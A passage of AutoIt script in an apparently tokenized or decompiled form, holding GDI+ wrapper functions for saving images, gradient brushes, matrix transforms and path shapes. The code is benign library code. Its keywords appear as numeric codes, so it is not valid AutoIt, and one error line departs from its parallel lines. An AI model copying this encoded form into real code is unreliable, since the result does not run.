4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGESAVEADD($HIMAGE,$TPARAMS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSaveAdd","handle",$HIMAGE,"struct*",$TPARAMS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGESAVEADDIMAGE($HIMAGE,$HIMAGENEW,$TPARAMS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSaveAddImage","handle",$HIMAGE,"handle",$HIMAGENEW,"struct*",$TPARAMS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGESAVETOFILE($HIMAGE,$SFILENAME)
28$SEXT=__GDIPLUS_EXTRACTFILEEXT($SFILENAME)
28$SCLSID=_GDIPLUS_ENCODERSGETCLSID($SEXT)
4$SCLSID=""534287(-1,0,40)
28$BRET=_GDIPLUS_IMAGESAVETOFILEEX($HIMAGE,$SFILENAME,$SCLSID,0)
34287(@ERROR,@EXTENDED,$BRET)
33
32_GDIPLUS_IMAGESAVETOFILEEX($HIMAGE,$SFILENAME,$SENCODER,$TPARAMS=0)
28$TGUID=_WINAPI_GUIDFROMSTRING($SENCODER)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSaveImageToFile","handle",$HIMAGE,"wstr",$SFILENAME,"struct*",$TGUID,"struct*",$TPARAMS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGESAVETOSTREAM($HIMAGE,$PSTREAM,$TENCODER,$TPARAMS=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSaveImageToStream","handle",$HIMAGE,"ptr",$PSTREAM,"struct*",$TENCODER,"struct*",$TPARAMS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGESCALE($HIMAGE,$ISCALEW,$ISCALEH,$IINTERPOLATIONMODE=$GDIP_INTERPOLATIONMODE_HIGHQUALITYBICUBIC)
28$IWIDTH=_GDIPLUS_IMAGEGETWIDTH($HIMAGE)*$ISCALEW
4@ERROR534287(1,0,0)
28$IHEIGHT=_GDIPLUS_IMAGEGETHEIGHT($HIMAGE)*$ISCALEH
4@ERROR534287(2,0,0)
28$HBITMAP=_GDIPLUS_BITMAPCREATEFROMSCAN0($IWIDTH,$IHEIGHT)
4@ERROR534287(3,0,0)
28$HBMPCTXT=_GDIPLUS_IMAGEGETGRAPHICSCONTEXT($HBITMAP)
4@ERROR5
_GDIPLUS_BITMAPDISPOSE($HBITMAP)
34287(4,0,0)
8
_GDIPLUS_GRAPHICSSETINTERPOLATIONMODE($HBMPCTXT,$IINTERPOLATIONMODE)
4@ERROR5
_GDIPLUS_GRAPHICSDISPOSE($HBMPCTXT)
_GDIPLUS_BITMAPDISPOSE($HBITMAP)
34287(5,0,0)
8
_GDIPLUS_GRAPHICSDRAWIMAGERECT($HBMPCTXT,$HIMAGE,0,0,$IWIDTH,$IHEIGHT)
4@ERROR5
_GDIPLUS_GRAPHICSDISPOSE($HBMPCTXT)
_GDIPLUS_BITMAPDISPOSE($HBITMAP)
34287(6,0,0)
8
_GDIPLUS_GRAPHICSDISPOSE($HBMPCTXT)
34$HBITMAP
33
32_GDIPLUS_IMAGESELECTACTIVEFRAME($HIMAGE,$SDIMENSIONID,$IFRAMEINDEX)
28$TGUID=_WINAPI_GUIDFROMSTRING($SDIMENSIONID)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipImageSelectActiveFrame","handle",$HIMAGE,"struct*",$TGUID,"uint",$IFRAMEINDEX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_IMAGERESIZE($HIMAGE,$INEWWIDTH,$INEWHEIGHT,$IINTERPOLATIONMODE=$GDIP_INTERPOLATIONMODE_HIGHQUALITYBICUBIC)
28$HBITMAP=_GDIPLUS_BITMAPCREATEFROMSCAN0($INEWWIDTH,$INEWHEIGHT)
4@ERROR534287(1,0,0)
28$HBMPCTXT=_GDIPLUS_IMAGEGETGRAPHICSCONTEXT($HBITMAP)
4@ERROR5
_GDIPLUS_BITMAPDISPOSE($HBITMAP)
34287(2,@EXTENDED,0)
8
_GDIPLUS_GRAPHICSSETINTERPOLATIONMODE($HBMPCTXT,$IINTERPOLATIONMODE)
4@ERROR5
_GDIPLUS_GRAPHICSDISPOSE($HBMPCTXT)
_GDIPLUS_BITMAPDISPOSE($HBITMAP)
34287(3,@EXTENDED,0)
8
_GDIPLUS_GRAPHICSDRAWIMAGERECT($HBMPCTXT,$HIMAGE,0,0,$INEWWIDTH,$INEWHEIGHT)
4@ERROR5
_GDIPLUS_GRAPHICSDISPOSE($HBMPCTXT)
_GDIPLUS_BITMAPDISPOSE($HBITMAP)
34287(4,@EXTENDED,0)
8
_GDIPLUS_GRAPHICSDISPOSE($HBMPCTXT)
34$HBITMAP
33
32_GDIPLUS_LINEBRUSHCREATE($NX1,$NY1,$NX2,$NY2,$IARGBCLR1,$IARGBCLR2,$IWRAPMODE=0)
28$TPOINTF1,$TPOINTF2,$ARESULT
$TPOINTF1=65("float;float")
$TPOINTF2=65("float;float")
69($TPOINTF1,1,$NX1)
69($TPOINTF1,2,$NY1)
69($TPOINTF2,1,$NX2)
69($TPOINTF2,2,$NY2)
$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateLineBrush","struct*",$TPOINTF1,"struct*",$TPOINTF2,"uint",$IARGBCLR1,"uint",$IARGBCLR2,"int",$IWRAPMODE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[6]
33
32_GDIPLUS_LINEBRUSHCREATEFROMRECT($TRECTF,$IARGBCLR1,$IARGBCLR2,$IGRADIENTMODE=0,$IWRAPMODE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateLineBrushFromRect","struct*",$TRECTF,"uint",$IARGBCLR1,"uint",$IARGBCLR2,"int",$IGRADIENTMODE,"int",$IWRAPMODE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[6]
33
32_GDIPLUS_LINEBRUSHCREATEFROMRECTWITHANGLE($TRECTF,$IARGBCLR1,$IARGBCLR2,$FANGLE,$BISANGLESCALABLE=39,$IWRAPMODE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateLineBrushFromRectWithAngle","struct*",$TRECTF,"uint",$IARGBCLR1,"uint",$IARGBCLR2,"float",$FANGLE,"int",$BISANGLESCALABLE,"int",$IWRAPMODE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[7]
33
32_GDIPLUS_LINEBRUSHGETCOLORS($HLINEGRADIENTBRUSH)
28$TARGBS,$AARGBS[2],$ARESULT
$TARGBS=65("uint;uint")
$ARESULT=58($__G_HGDIPDLL,"uint","GdipGetLineColors","handle",$HLINEGRADIENTBRUSH,"struct*",$TARGBS)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
$AARGBS[0]=66($TARGBS,1)
$AARGBS[1]=66($TARGBS,2)
34$AARGBS
33
32_GDIPLUS_LINEBRUSHGETRECT($HLINEGRADIENTBRUSH)
28$TRECTF=65($TAGGDIPRECTF)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetLineRect","handle",$HLINEGRADIENTBRUSH,"struct*",$TRECTF)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$ARECTF[4]
13$II=1154
$ARECTF[$II-1]=66($TRECTF,$II)
14
34$ARECTF
33
32_GDIPLUS_LINEBRUSHMULTIPLYTRANSFORM($HLINEGRADIENTBRUSH,$HMATRIX,$IORDER=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipMultiplyLineTransform","handle",$HLINEGRADIENTBRUSH,"handle",$HMATRIX,"int",$IORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_LINEBRUSHRESETTRANSFORM($HLINEGRADIENTBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipResetLineTransform","handle",$HLINEGRADIENTBRUSH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_LINEBRUSHSETBLEND($HLINEGRADIENTBRUSH,$ABLENDS)
28$II,$ICOUNT,$TFACTORS,$TPOSITIONS,$ARESULT
$ICOUNT=$ABLENDS[0][0]
$TFACTORS=65("float["&$ICOUNT&"]")
$TPOSITIONS=65("float["&$ICOUNT&"]")
13$II=115$ICOUNT
69($TFACTORS,1,$ABLENDS[$II][0],$II)
69($TPOSITIONS,1,$ABLENDS[$II][1],$II)
14
$ARESULT=58($__G_HGDIPDLL,"int","GdipSetLineBlend","handle",$HLINEGRADIENTBRUSH,"struct*",$TFACTORS,"struct*",$TPOSITIONS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_LINEBRUSHSETCOLORS($HLINEGRADIENTBRUSH,$IARGBSTART,$IARGBEND)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetLineColors","handle",$HLINEGRADIENTBRUSH,"uint",$IARGBSTART,"uint",$IARGBEND)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_LINEBRUSHSETGAMMACORRECTION($HLINEGRADIENTBRUSH,$BUSEGAMMACORRECTION=39)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetLineGammaCorrection","handle",$HLINEGRADIENTBRUSH,"int",$BUSEGAMMACORRECTION)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_LINEBRUSHSETLINEARBLEND($HLINEGRADIENTBRUSH,$FFOCUS,$FSCALE=1)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetLineLinearBlend","handle",$HLINEGRADIENTBRUSH,"float",$FFOCUS,"float",$FSCALE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_LINEBRUSHSETPRESETBLEND($HLINEGRADIENTBRUSH,$AINTERPOLATIONS)
28$II,$ICOUNT,$TCOLORS,$TPOSITIONS,$ARESULT
$ICOUNT=$AINTERPOLATIONS[0][0]
$TCOLORS=65("uint["&$ICOUNT&"]")
$TPOSITIONS=65("float["&$ICOUNT&"]")
13$II=115$ICOUNT
69($TCOLORS,1,$AINTERPOLATIONS[$II][0],$II)
69($TPOSITIONS,1,$AINTERPOLATIONS[$II][1],$II)
14
$ARESULT=58($__G_HGDIPDLL,"int","GdipSetLinePresetBlend","handle",$HLINEGRADIENTBRUSH,"struct*",$TCOLORS,"struct*",$TPOSITIONS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_LINEBRUSHSETSIGMABLEND($HLINEGRADIENTBRUSH,$FFOCUS,$FSCALE=1)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetLineSigmaBlend","handle",$HLINEGRADIENTBRUSH,"float",$FFOCUS,"float",$FSCALE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_LINEBRUSHSETTRANSFORM($HLINEGRADIENTBRUSH,$HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetLineTransform","handle",$HLINEGRADIENTBRUSH,"handle",$HMATRIX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_MATRIXCREATE()
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateMatrix","handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[1]
33
32_GDIPLUS_MATRIXCREATE2($NM11=1,$NM12=1,$NM21=1,$NM22=1,$NDX=0,$NDY=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateMatrix2","float",$NM11,"float",$NM12,"float",$NM21,"float",$NM22,"float",$NDX,"float",$NDY,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[7]
33
32_GDIPLUS_MATRIXCLONE($HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCloneMatrix","handle",$HMATRIX,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_MATRIXDISPOSE($HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteMatrix","handle",$HMATRIX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_MATRIXGETELEMENTS($HMATRIX)
28$TELEMENTS=65("float[6]")
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetMatrixElements","handle",$HMATRIX,"struct*",$TELEMENTS)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$AELEMENTS[6]
13$II=1156
$AELEMENTS[$II-1]=66($TELEMENTS,1,$II)
14
34$AELEMENTS
33
32_GDIPLUS_MATRIXINVERT($HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipInvertMatrix","handle",$HMATRIX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_MATRIXMULTIPLY($HMATRIX1,$HMATRIX2,$IORDER=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipMultiplyMatrix","handle",$HMATRIX1,"handle",$HMATRIX2,"int",$IORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_MATRIXROTATE($HMATRIX,$FANGLE,$BAPPEND=40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipRotateMatrix","handle",$HMATRIX,"float",$FANGLE,"int",$BAPPEND)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_MATRIXSCALE($HMATRIX,$FSCALEX,$FSCALEY,$BORDER=40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipScaleMatrix","handle",$HMATRIX,"float",$FSCALEX,"float",$FSCALEY,"int",$BORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_MATRIXSETELEMENTS($HMATRIX,$NM11=1,$NM12=0,$NM21=0,$NM22=1,$NDX=0,$NDY=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetMatrixElements","handle",$HMATRIX,"float",$NM11,"float",$NM12,"float",$NM21,"float",$NM22,"float",$NDX,"float",$NDY)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_MATRIXSHEAR($HMATRIX,$FSHEARX,$FSHEARY,$IORDER=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipShearMatrix","handle",$HMATRIX,"float",$FSHEARX,"float",$FSHEARY,"int",$IORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_MATRIXTRANSFORMPOINTS($HMATRIX,36$APOINTS)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],($II-1)*2+1)
69($TPOINTS,1,$APOINTS[$II][1],($II-1)*2+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipTransformMatrixPoints","handle",$HMATRIX,"struct*",$TPOINTS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
13$II=115$ICOUNT
$APOINTS[$II][0]=66($TPOINTS,1,($II-1)*2+1)
$APOINTS[$II][1]=66($TPOINTS,1,($II-1)*2+2)
14
3439
33
32_GDIPLUS_MATRIXTRANSLATE($HMATRIX,$FOFFSETX,$FOFFSETY,$BAPPEND=40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipTranslateMatrix","handle",$HMATRIX,"float",$FOFFSETX,"float",$FOFFSETY,"int",$BAPPEND)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PARAMADD(36$TPARAMS,$SGUID,$INBOFVALUES,$ITYPE,$PVALUES)
28$ICOUNT=66($TPARAMS,"Count")
28$PGUID=67($TPARAMS,"GUID")+($ICOUNT*_GDIPLUS_PARAMSIZE())
28$TPARAM=65($TAGGDIPENCODERPARAM,$PGUID)
_WINAPI_GUIDFROMSTRINGEX($SGUID,$PGUID)
69($TPARAM,"Type",$ITYPE)
69($TPARAM,"NumberOfValues",$INBOFVALUES)
69($TPARAM,"Values",$PVALUES)
69($TPARAMS,"Count",$ICOUNT+1)
33
32_GDIPLUS_PARAMINIT($ICOUNT)
28$SSTRUCT=$TAGGDIPENCODERPARAMS
13$I=215$ICOUNT
$SSTRUCT&=";struct;byte[16];ulong;ulong;ptr;endstruct"
14
3465($SSTRUCT)
33
32_GDIPLUS_PARAMSIZE()
28$TPARAM=65($TAGGDIPENCODERPARAM)
3468($TPARAM)
33
32_GDIPLUS_PATHADDARC($HPATH,$NX,$NY,$NWIDTH,$NHEIGHT,$FSTARTANGLE,$FSWEEPANGLE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathArc","handle",$HPATH,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT,"float",$FSTARTANGLE,"float",$FSWEEPANGLE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDBEZIER($HPATH,$NX1,$NY1,$NX2,$NY2,$NX3,$NY3,$NX4,$NY4)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathBezier","handle",$HPATH,"float",$NX1,"float",$NY1,"float",$NX2,"float",$NY2,"float",$NX3,"float",$NY3,"float",$NX4,"float",$NY4)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDCLOSEDCURVE($HPATH,$APOINTS)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathClosedCurve","handle",$HPATH,"struct*",$TPOINTS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDCLOSEDCURVE2($HPATH,$APOINTS,$NTENSION=0.5)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathClosedCurve2","handle",$HPATH,"struct*",$TPOINTS,"int",$ICOUNT,"float",$NTENSION)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDCURVE($HPATH,$APOINTS)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathCurve","handle",$HPATH,"struct*",$TPOINTS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDCURVE2($HPATH,$APOINTS,$NTENSION=0.5)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathCurve2","handle",$HPATH,"struct*",$TPOINTS,"int",$ICOUNT,"float",$NTENSION)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDCURVE3($HPATH,$APOINTS,$IOFFSET,$INUMOFSEGMENTS,$NTENSION=0.5)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathCurve3","handle",$HPATH,"struct*",$TPOINTS,"int",$ICOUNT,"int",$IOFFSET,"int",$INUMOFSEGMENTS,"float",$NTENSION)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDELLIPSE($HPATH,$NX,$NY,$NWIDTH,$NHEIGHT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathEllipse","handle",$HPATH,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDLINE($HPATH,$NX1,$NY1,$NX2,$NY2)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathLine","handle",$HPATH,"float",$NX1,"float",$NY1,"float",$NX2,"float",$NY2)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDLINE2($HPATH,$APOINTS)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathLine2","handle",$HPATH,"struct*",$TPOINTS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]5287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDPATH($HPATH1,$HPATH2,$BCONNECT=39)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathPath","handle",$HPATH1,"handle",$HPATH2,"int",$BCONNECT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDPIE($HPATH,$NX,$NY,$NWIDTH,$NHEIGHT,$FSTARTANGLE,$FSWEEPANGLE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathPie","handle",$HPATH,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT,"float",$FSTARTANGLE,"float",$FSWEEPANGLE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDPOLYGON($HPATH,$APOINTS)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathPolygon","handle",$HPATH,"struct*",$TPOINTS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDRECTANGLE($HPATH,$NX,$NY,$NWIDTH,$NHEIGHT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathRectangle","handle",$HPATH,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHADDSTRING($HPATH,$SSTRING,$TLAYOUT,$HFAMILY,$ISTYLE=0,$FSIZE=8.5,$HFORMAT=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipAddPathString","handle",$HPATH,"wstr",$SSTRING,"int",-1,"handle",$HFAMILY,"int",$ISTYLE,"float",$FSIZE,"struct*",$TLAYOUT,"handle",$HFORMAT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHCREATE($APOINTS,$IWRAPMODE=0)
28$ICOUNT=$APOINTS[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APOINTS[$II][1],(($II-1)*2)+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreatePathGradient","struct*",$TPOINTS,"int",$ICOUNT,"int",$IWRAPMODE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[4]
33
32_GDIPLUS_PATHBRUSHCREATEFROMPATH($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreatePathGradientFromPath","handle",$HPATH,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_PATHBRUSHGETCENTERPOINT($HPATHGRADIENTBRUSH)
28$TPOINTF=65("float;float")
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathGradientCenterPoint","handle",$HPATHGRADIENTBRUSH,"struct*",$TPOINTF)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$APOINTF[2]
$APOINTF[0]=66($TPOINTF,1)
$APOINTF[1]=66($TPOINTF,2)
34$APOINTF
33
32_GDIPLUS_PATHBRUSHGETFOCUSSCALES($HPATHGRADIENTBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathGradientFocusScales","handle",$HPATHGRADIENTBRUSH,"float*",0,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$ASCALES[2]
$ASCALES[0]=$ARESULT[2]
$ASCALES[1]=$ARESULT[3]
34$ASCALES
33
32_GDIPLUS_PATHBRUSHGETPOINTCOUNT($HPATHGRADIENTBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathGradientPointCount","handle",$HPATHGRADIENTBRUSH,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PATHBRUSHGETRECT($HPATHGRADIENTBRUSH)
28$TRECTF=65($TAGGDIPRECTF)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathGradientRect","handle",$HPATHGRADIENTBRUSH,"struct*",$TRECTF)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$ARECTF[4]
13$II=1154
$ARECTF[$II-1]=66($TRECTF,$II)
14
34$ARECTF
33
32_GDIPLUS_PATHBRUSHGETWRAPMODE($HPATHGRADIENTBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathGradientWrapMode","handle",$HPATHGRADIENTBRUSH,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PATHBRUSHMULTIPLYTRANSFORM($HPATHGRADIENTBRUSH,$HMATRIX,$IORDER=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipMultiplyPathGradientTransform","handle",$HPATHGRADIENTBRUSH,"handle",$HMATRIX,"int",$IORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHRESETTRANSFORM($HPATHGRADIENTBRUSH)
